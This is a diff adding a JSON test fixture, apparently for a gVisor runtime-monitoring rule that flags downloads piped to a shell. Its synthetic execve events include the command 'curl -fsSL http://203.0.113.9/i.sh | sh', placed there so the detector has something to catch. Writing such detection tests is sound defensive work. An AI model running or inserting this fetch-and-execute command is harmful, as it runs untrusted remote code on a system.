@@ -1,0 +1,42 @@
+{
+  "description": "curl | sh, detected from the stdin pipe and from the command line.",
+  "expect": [
+    "gVisor Download Piped to Shell"
+  ],
+  "events": [
+    {
+      "point": "sentry/execve",
+      "pid": 1,
+      "ppid": 0,
+      "comm": "sh",
+      "exe": "/bin/sh",
+      "argv": [
+        "/bin/sh"
+      ]
+    },
+    {
+      "point": "sentry/execve",
+      "pid": 2,
+      "ppid": 1,
+      "comm": "sh",
+      "exe": "/bin/sh",
+      "argv": [
+        "sh"
+      ],
+      "stdin": "pipe",
+      "stdin_pipe_proc": "curl"
+    },
+    {
+      "point": "sentry/execve",
+      "pid": 3,
+      "ppid": 1,
+      "comm": "sh",
+      "exe": "/bin/sh",
+      "argv": [
+        "sh",
+        "-c",
+        "curl -fsSL http://203.0.113.9/i.sh | sh"
+      ]
+    }
+  ]
+}
